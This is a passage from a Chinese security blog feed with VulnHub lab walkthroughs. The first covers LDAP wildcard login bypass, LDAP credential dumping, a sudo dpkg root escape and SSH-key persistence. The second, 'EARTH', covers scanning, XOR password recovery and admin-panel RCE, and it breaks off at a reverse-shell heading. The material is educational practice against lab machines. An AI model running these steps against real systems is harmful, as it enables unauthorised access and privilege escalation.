&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-095.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;分析在 http://192.168.31.81/admin.php 输入 user=*，pass=* 登陆成功的原因&lt;br&gt;
我们必须记住，我们仍在处理 LDAP，当我们处理身份验证时，我们总是想检查页面是如何处理它的。在这种情况下，我们的目标是 admin.php 页面。&lt;/p&gt;
&lt;p&gt;我们认为 LFI	有可能只是因为 URL	与 localhost	连接，以获取 Portraits.php 文件，利用 burpsuite 进行抓取 http://192.168.31.81/home.php?url admin.php 登陆时的数据包。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-096.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名：admin 密码：qMDdyZh3cT6eeAWD，实际上用于连接 LDAP&lt;br&gt;
 &lt;code&gt;$bind = ldap_bind($ldap_ch, &amp;quot;cn=admin,dc=symfonos,dc=local&amp;quot;,&amp;quot;qMDdyZh3cT6eeAWD&amp;quot;);&lt;/code&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ldap信息枚举&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ldapsearch -h 192.168.31.81 -D &amp;quot;cn=admin,dc=symfonos,dc=local&amp;quot; -w &amp;#x27;qMDdyZh3cT6eeAWD&amp;#x27; -x -b &amp;quot;dc=symfonos,dc=local&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-D binddn &lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt; DN&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-w passwd &lt;span class=&#34;built_in&#34;&gt;bind&lt;/span&gt; password (&lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; simple authentication)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-x Simple authentication&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-b basedn base dn &lt;span class=&#34;keyword&#34;&gt;for&lt;/span&gt; search&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-097.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取到信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;admin e1NTSEF9VVdZeHZ1aEEwYldzamZyMmJodHhRYmFwcjllU2dLVm0=&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;zeus Y2V0a0tmNHdDdUhDOUZFVA==&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;base64&lt;/span&gt; 解码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;Y2V0a0tmNHdDdUhDOUZFVA==&amp;quot; | base64 -d&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;base64&lt;/span&gt; 编码：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;cetkKf4wCuHC9FET&amp;quot; | base64&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-098.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; admin:{SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm&lt;br&gt;
-&amp;gt; zeus:cetkKf4wCuHC9FET&lt;/p&gt;
&lt;h3 id=&#34;dpkg-shell-提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#dpkg-shell-提权&#34;&gt;#&lt;/a&gt; dpkg-shell 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;登录靶机&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh zeus@192.168.31.81 &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cetkKf4wCuHC9FET&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-099.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看相关权限设置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;发现dpkg拥有root权限，可通过dpkg提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;详细网址：https://gtfobins.github.io/gtfobins/dpkg/&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-100.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;输入以下命令：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo dpkg -l &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在弹出来的交互式中继续输入!/bin/sh&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-101.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;ssh-密钥对维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-密钥对维权&#34;&gt;#&lt;/a&gt; SSH 密钥对维权&lt;/h3&gt;
&lt;p&gt;提前准备好配对好的私钥和公钥，将公钥发到靶机&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys &amp;amp;&amp;amp; rm - f ~/.ssh/id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ll | grep id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.127 -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-102.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 免密成功，下次可直接登录&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/105%20EARTH/</id>
        <title>VULNHUB 5 EARTH</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/105%20EARTH/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdGhlLXBsYW5ldHMtZWFydGgsNzU1Lw==&#34;&gt;https://www.vulnhub.com/entry/the-planets-earth,755/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3ZhbGVjYWxpZGEvYXJ0aWNsZS9kZXRhaWxzLzEyMTMxNjkzNA==&#34;&gt;https://blog.csdn.net/valecalida/article/details/121316934&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 EARTH：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-060.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.0/24 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-061.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.67&lt;/p&gt;
&lt;h3 id=&#34;端口扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#端口扫描&#34;&gt;#&lt;/a&gt; 端口扫描&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p 1-1024 192.168.31. 67 -oN /tmp/earth.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-062.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;修改本地-hosts&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#修改本地-hosts&#34;&gt;#&lt;/a&gt; 修改本地 Hosts&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuNjc=&#34;&gt;http://192.168.31.67&lt;/span&gt; &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjY3&#34;&gt;https://192.168.31.67&lt;/span&gt; 发现两个网址都无法打开&lt;br&gt;
注意到端口扫描的结果中， 443 中有如下说明：&lt;br&gt;
Subject Alternative Name: DNS:earth.local, DNS:terratest.earth.local&lt;br&gt;
 尝试修改本地 hosts 文件，将这两个域名解析指向 192.168.31.67&lt;/p&gt;
&lt;p&gt;&lt;code&gt;sudo echo ‘192.168.31.67 earth.local terratest.earth.local’ &amp;gt;&amp;gt; /etc/hosts&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-063.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 更多信息暴露，有了更多的攻击面：&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VhcnRoLmxvY2FsLw==&#34;&gt;http://earth.local/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lYXJ0aC5sb2NhbC8=&#34;&gt;https://earth.local/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3RlcnJhdGVzdC5lYXJ0aC5sb2NhbC8=&#34;&gt;http://terratest.earth.local/&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwv&#34;&gt;https://terratest.earth.local/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;目录扫描&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#目录扫描&#34;&gt;#&lt;/a&gt; 目录扫描&lt;/h3&gt;
&lt;p&gt;打开网站：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VhcnRoLmxvY2FsLw==&#34;&gt;http://earth.local/&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对此网站进行目录扫描&lt;br&gt;
 &lt;code&gt;dirsearch -u http://earth.local&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-064.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;弱口令测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#弱口令测试&#34;&gt;#&lt;/a&gt; 弱口令测试&lt;/h3&gt;
&lt;p&gt;登录地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2VhcnRoLmxvY2FsL2FkbWluL2xvZ2lu&#34;&gt;http://earth.local/admin/login&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-065.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;其他网址测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#其他网址测试&#34;&gt;#&lt;/a&gt; 其他网址测试&lt;/h3&gt;
&lt;p&gt;对其他三个网站进行目录扫描&lt;/p&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u https://earth.local/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-066.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://terratest.earth.local/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-067.png&#34; width=&#34;380&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u https://terratest.earth.local/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-068.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现目录：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvcm9ib3RzLnR4dA==&#34;&gt;https://terratest.earth.local/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;对 https://terratest.earth.local/robots.txt 进行分析&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-069.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 发现可疑地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGluZ25vdGVzLnR4dA==&#34;&gt;https://terratest.earth.local/testingnotes.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-070.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;下一步攻击思路，首页打开的数字字母的排列组合是 xor 加密运算&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-071.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly90ZXJyYXRlc3QuZWFydGgubG9jYWwvdGVzdGRhdGEudHh0&#34;&gt;https://terratest.earth.local/testdata.txt&lt;/span&gt; 为测试加密数据&lt;/p&gt;
&lt;p&gt;管理用户中有管理员：terra&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-072.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;xor-加密破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#xor-加密破解&#34;&gt;#&lt;/a&gt; Xor 加密破解&lt;/h3&gt;
&lt;p&gt;编写 python 脚本，以 testdata.txt 为密钥，并注意删除其后面的空行，对首页得到的三份数据进行解密&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; 1.py &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;import binascii&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;data1 =&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;quot;2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;f = binascii.b2a_hex(open(&amp;#x27;testdata.txt&amp;#x27;, &amp;#x27;rb&amp;#x27;).read()).decode()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;print(hex(int(data1,16) ^ int(f,16)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-073.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;在线 16 进制数据转为字符串：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5hYjE3My5jb20vY29udmVydC9veDJzdHIucGhw&#34;&gt;http://www.ab173.com/convert/ox2str.php&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-074.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 去掉重复值得到：earthclimatechangebad4humans&lt;/p&gt;
&lt;h3 id=&#34;账户密码利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#账户密码利用&#34;&gt;#&lt;/a&gt; 账户密码利用&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;已有凭据&lt;br&gt;
现在已成功拥有账户：terra&lt;br&gt;
 密码：earthclimatechangebad4humans&lt;br&gt;
 尝试进行连接：ssh &lt;span class=&#34;exturl&#34; data-url=&#34;bWFpbHRvOnRlcnJhQDE5Mi4xNjguMzEuNjc=&#34;&gt;terra@192.168.31.67&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-075.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 排除掉这是 ssh 的用户和密码&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;从之前得到的网址尝试登陆&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9lYXJ0aC5sb2NhbC9hZG1pbi9sb2dpbg==&#34;&gt; https://earth.local/admin/login&lt;/span&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-076.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;登陆成功，发现 RCE 代码执行漏洞&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-077.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;rce-漏洞反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rce-漏洞反弹shell&#34;&gt;#&lt;/a&gt; RCE 漏洞反弹 shell&lt;/h3&gt;
&lt;ol&gt;
&lt;li&gt;从之前得到的网址尝试登陆&lt;/li&gt;
&lt;/ol&gt;
